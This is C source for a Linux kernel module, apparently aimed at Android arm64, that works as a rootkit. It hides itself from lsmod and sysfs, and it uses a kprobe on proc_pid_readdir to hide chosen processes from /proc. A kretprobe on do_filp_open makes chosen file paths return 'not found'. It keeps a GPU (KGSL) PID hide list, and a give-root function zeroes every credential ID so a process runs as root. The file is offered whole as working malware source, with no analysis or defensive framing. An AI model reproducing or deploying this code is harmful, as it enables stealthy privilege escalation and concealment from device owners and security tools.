#include "linyu.h"
#include "comm.h"
#include <linux/list.h>
#include <linux/rcupdate.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/sched/signal.h>
#include <linux/cred.h>

int linyu_hide_module(void)
{
	struct list_head *mod_list;

	if (!THIS_MODULE)
		return -EINVAL;

	mod_list = &THIS_MODULE->list;
	if (mod_list->prev && mod_list->next)
		list_del_init(mod_list);

	if (THIS_MODULE->mkobj.kobj.sd)
		kobject_del(&THIS_MODULE->mkobj.kobj);

	linyu_info("module hidden from lsmod\n");
	return 0;
}

#define MAX_HIDDEN_PIDS  64
#define MAX_HIDDEN_PATHS 32
#define MAX_PATH_LEN     256

static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int   hidden_pid_count;
static DEFINE_SPINLOCK(hide_pid_lock);

static char  hidden_paths[MAX_HIDDEN_PATHS][MAX_PATH_LEN];
static int   hidden_path_count;
static DEFINE_SPINLOCK(hide_path_lock);

static pid_t hidden_kgsl_pids[MAX_HIDDEN_PIDS];
static int   hidden_kgsl_count;
static DEFINE_SPINLOCK(kgsl_hide_lock);

bool linyu_hide_pid_match(pid_t pid)
{
	int i;
	unsigned long flags;
	bool found = false;

	spin_lock_irqsave(&hide_pid_lock, flags);
	for (i = 0; i < hidden_pid_count; i++) {
		if (hidden_pids[i] == pid) {
			found = true;
			break;
		}
	}
	spin_unlock_irqrestore(&hide_pid_lock, flags);
	return found;
}

bool linyu_hide_path_match(const char *fullpath)
{
	int i;
	unsigned long flags;
	bool found = false;

	if (!fullpath)
		return false;

	spin_lock_irqsave(&hide_path_lock, flags);
	for (i = 0; i < hidden_path_count; i++) {
		const char *needle = hidden_paths[i];
		if (needle[0] == '\0')
			continue;
		if (strstr(fullpath, needle)) {
			found = true;
			break;
		}
	}
	spin_unlock_irqrestore(&hide_path_lock, flags);
	return found;
}

#define is_pid_hidden  linyu_hide_pid_match
#define is_path_hidden linyu_hide_path_match

struct actor_slot {
	struct dir_context *ctx;
	filldir_t           orig;
};

#define ACTOR_TABLE_SIZE 32
static struct actor_slot actor_table[ACTOR_TABLE_SIZE];
static DEFINE_SPINLOCK(actor_table_lock);

static filldir_t linyu_hide_actor_table_get(struct dir_context *ctx)
{
	int i;
	filldir_t orig = NULL;
	unsigned long flags;

	spin_lock_irqsave(&actor_table_lock, flags);
	for (i = 0; i < ACTOR_TABLE_SIZE; i++) {
		if (actor_table[i].ctx == ctx) {
			orig = actor_table[i].orig;
			break;
		}
	}
	spin_unlock_irqrestore(&actor_table_lock, flags);
	return orig;
}

static bool linyu_hide_actor_table_put(struct dir_context *ctx, filldir_t orig)
{
	int i, slot = -1;
	unsigned long flags;

	spin_lock_irqsave(&actor_table_lock, flags);
	for (i = 0; i < ACTOR_TABLE_SIZE; i++) {
		if (actor_table[i].ctx == ctx) { slot = i; break; }
		if (slot < 0 && actor_table[i].ctx == NULL) slot = i;
	}
	if (slot < 0) {
		spin_unlock_irqrestore(&actor_table_lock, flags);
		return false;
	}
	actor_table[slot].ctx  = ctx;
	actor_table[slot].orig = orig;
	spin_unlock_irqrestore(&actor_table_lock, flags);
	return true;
}

static void linyu_hide_actor_table_clear(struct dir_context *ctx)
{
	int i;
	unsigned long flags;

	spin_lock_irqsave(&actor_table_lock, flags);
	for (i = 0; i < ACTOR_TABLE_SIZE; i++) {
		if (actor_table[i].ctx == ctx) {
			actor_table[i].ctx = NULL;
			actor_table[i].orig = NULL;
		}
	}
	spin_unlock_irqrestore(&actor_table_lock, flags);
}

static bool linyu_hide_name_matches_pid(const char *name, int namelen)
{
	pid_t pid = 0;
	int i;

	if (namelen <= 0 || namelen > 10)
		return false;
	for (i = 0; i < namelen; i++) {
		char c = name[i];
		if (c < '0' || c > '9')
			return false;
		pid = pid * 10 + (c - '0');
	}
	return is_pid_hidden(pid);
}

static bool linyu_hide_filldir_actor(struct dir_context *ctx, const char *name,
			       int namelen, loff_t offset, u64 ino,
			       unsigned d_type)
{
	filldir_t orig = linyu_hide_actor_table_get(ctx);

	if (linyu_hide_name_matches_pid(name, namelen))
		return true; 

	if (!orig)
		return true;

	return orig(ctx, name, namelen, offset, ino, d_type);
}

static struct kprobe proc_readdir_kp;
static bool proc_readdir_kp_registered;

static int linyu_hide_proc_readdir_pre(struct kprobe *p, struct pt_regs *regs)
{
	struct dir_context *ctx = (struct dir_context *)regs->regs[1];

	if (!ctx || !ctx->actor)
		return 0;
	if (ctx->actor == linyu_hide_filldir_actor)
		return 0;

	if (linyu_hide_actor_table_put(ctx, ctx->actor)) {
		

		*(filldir_t *)&ctx->actor = linyu_hide_filldir_actor;
	}
	return 0;
}

static void linyu_hide_proc_readdir_post(struct kprobe *p, struct pt_regs *regs,
			      unsigned long flags)
{
	

	struct dir_context *ctx = (struct dir_context *)regs->regs[1];
	filldir_t orig = linyu_hide_actor_table_get(ctx);
	if (orig) {
		*(filldir_t *)&ctx->actor = orig;
		linyu_hide_actor_table_clear(ctx);
	}
}

int linyu_hide_proc_init(void)
{
	if (proc_readdir_kp_registered)
		return 0;

	memset(actor_table, 0, sizeof(actor_table));

	proc_readdir_kp.symbol_name = "proc_pid_readdir";
	proc_readdir_kp.pre_handler = linyu_hide_proc_readdir_pre;
	proc_readdir_kp.post_handler = linyu_hide_proc_readdir_post;

	if (register_kprobe(&proc_readdir_kp) < 0) {
		linyu_warn("hide: kprobe @ proc_pid_readdir failed\n");
		return -1;
	}
	proc_readdir_kp_registered = true;
	linyu_info("hide: proc PID hide installed\n");
	return 0;
}

static void linyu_hide_path_uninstall(void);

void linyu_hide_proc_exit(void)
{
	if (proc_readdir_kp_registered) {
		unregister_kprobe(&proc_readdir_kp);
		proc_readdir_kp_registered = false;
	}
	linyu_hide_path_uninstall();
}

struct filp_rp_data {
	char fullpath[MAX_PATH_LEN];
	bool resolved;
};

static int linyu_hide_filp_open_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct filp_rp_data *d = (struct filp_rp_data *)ri->data;
	struct filename *fn;
	const char *name = NULL;

	d->resolved = false;
	d->fullpath[0] = '\0';

	
	fn = (struct filename *)regs->regs[1];
	if (fn) {
		
		name = (const char *)*(unsigned long *)((u8 *)fn + offsetof(struct filename, name));
		if (name && (unsigned long)name > PAGE_OFFSET) {
			strncpy(d->fullpath, name, sizeof(d->fullpath) - 1);
			d->fullpath[sizeof(d->fullpath) - 1] = '\0';
			d->resolved = true;
		}
	}
	return 0;
}

static int linyu_hide_filp_open_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct filp_rp_data *d = (struct filp_rp_data *)ri->data;
	long rv;

	if (!d->resolved || hidden_path_count == 0)
		return 0;

	if (!is_path_hidden(d->fullpath))
		return 0;

	rv = (long)regs->regs[0];
	
	if (!IS_ERR_VALUE((unsigned long)rv) && rv != 0) {
		

		regs->regs[0] = (unsigned long)-ENOENT;
	} else if (rv == 0) {
		regs->regs[0] = (unsigned long)-ENOENT;
	}
	return 0;
}

static struct kretprobe filp_krp = {
	.entry_handler = linyu_hide_filp_open_entry,
	.handler       = linyu_hide_filp_open_ret,
	.data_size     = sizeof(struct filp_rp_data),
	.maxactive     = 64,
	.kp.symbol_name = "do_filp_open",
};

static bool filp_krp_registered;

static void linyu_hide_path_install_once(void)
{
	int ret;

	if (filp_krp_registered)
		return;
	ret = register_kretprobe(&filp_krp);
	if (ret) {
		linyu_warn("hide: kretprobe do_filp_open failed: %d\n", ret);
		return;
	}
	filp_krp_registered = true;
	linyu_info("hide: path-hide kretprobe installed\n");
}

static void linyu_hide_path_uninstall(void)
{
	if (filp_krp_registered) {
		unregister_kretprobe(&filp_krp);
		filp_krp_registered = false;
	}
}

int linyu_hide_process(unsigned long arg)
{
	struct linyu_hide_process_args a;
	unsigned long flags;
	int i;

	if (copy_from_user(&a, (void __user *)arg, sizeof(a)))
		return -EFAULT;
	if (a.pid < 1)
		return -EINVAL;

	spin_lock_irqsave(&hide_pid_lock, flags);
	for (i = 0; i < hidden_pid_count; i++) {
		if (hidden_pids[i] == a.pid) {
			spin_unlock_irqrestore(&hide_pid_lock, flags);
			return 0;
		}
	}
	if (hidden_pid_count >= MAX_HIDDEN_PIDS) {
		spin_unlock_irqrestore(&hide_pid_lock, flags);
		return -ENOSPC;
	}
	hidden_pids[hidden_pid_count++] = a.pid;
	spin_unlock_irqrestore(&hide_pid_lock, flags);

	linyu_info("hide: pid %d hidden\n", a.pid);
	return 0;
}

int linyu_hide_path(unsigned long arg)
{
	struct linyu_hide_path_args a;
	unsigned long flags;
	int i;

	if (copy_from_user(&a, (void __user *)arg, sizeof(a)))
		return -EFAULT;

	a.path[sizeof(a.path) - 1] = '\0';
	if (a.path[0] == '\0')
		return -EINVAL;

	spin_lock_irqsave(&hide_path_lock, flags);
	for (i = 0; i < hidden_path_count; i++) {
		if (strncmp(hidden_paths[i], a.path, MAX_PATH_LEN) == 0) {
			spin_unlock_irqrestore(&hide_path_lock, flags);
			return 0;
		}
	}
	if (hidden_path_count >= MAX_HIDDEN_PATHS) {
		spin_unlock_irqrestore(&hide_path_lock, flags);
		return -ENOSPC;
	}
	strncpy(hidden_paths[hidden_path_count], a.path, MAX_PATH_LEN - 1);
	hidden_paths[hidden_path_count][MAX_PATH_LEN - 1] = '\0';
	hidden_path_count++;
	spin_unlock_irqrestore(&hide_path_lock, flags);

	linyu_hide_path_install_once();

	linyu_info("hide: path '%s' hidden\n", a.path);
	return 0;
}

int linyu_hide_kgsl(unsigned long arg)
{
	struct linyu_hide_kgsl_args a;
	unsigned long flags;
	int i;

	if (copy_from_user(&a, (void __user *)arg, sizeof(a)))
		return -EFAULT;
	if (a.pid < 1)
		return -EINVAL;

	spin_lock_irqsave(&kgsl_hide_lock, flags);
	for (i = 0; i < hidden_kgsl_count; i++) {
		if (hidden_kgsl_pids[i] == a.pid) {
			spin_unlock_irqrestore(&kgsl_hide_lock, flags);
			return 0;
		}
	}
	if (hidden_kgsl_count < MAX_HIDDEN_PIDS)
		hidden_kgsl_pids[hidden_kgsl_count++] = a.pid;
	spin_unlock_irqrestore(&kgsl_hide_lock, flags);
	return 0;
}

int linyu_process_give_root(unsigned long arg)
{
	struct linyu_give_root_args a;
	struct cred *(*fn_prepare_creds)(void);
	int (*fn_commit_creds)(struct cred *);
	struct cred *new_cred;

	if (copy_from_user(&a, (void __user *)arg, sizeof(a)))
		return -EFAULT;

	fn_prepare_creds = (void *)linyu_resolve_symbol("prepare_creds");
	fn_commit_creds  = (void *)linyu_resolve_symbol("commit_creds");
	if (!fn_prepare_creds || !fn_commit_creds) {
		linyu_err("root: cannot resolve cred fns\n");
		return -ENOENT;
	}

	new_cred = fn_prepare_creds();
	if (!new_cred)
		return -ENOMEM;

	new_cred->uid.val   = 0;
	new_cred->gid.val   = 0;
	new_cred->euid.val  = 0;
	new_cred->egid.val  = 0;
	new_cred->suid.val  = 0;
	new_cred->sgid.val  = 0;
	new_cred->fsuid.val = 0;
	new_cred->fsgid.val = 0;

	fn_commit_creds(new_cred);
	linyu_info("root: pid %d elevated to root\n", a.pid);
	return 0;
}
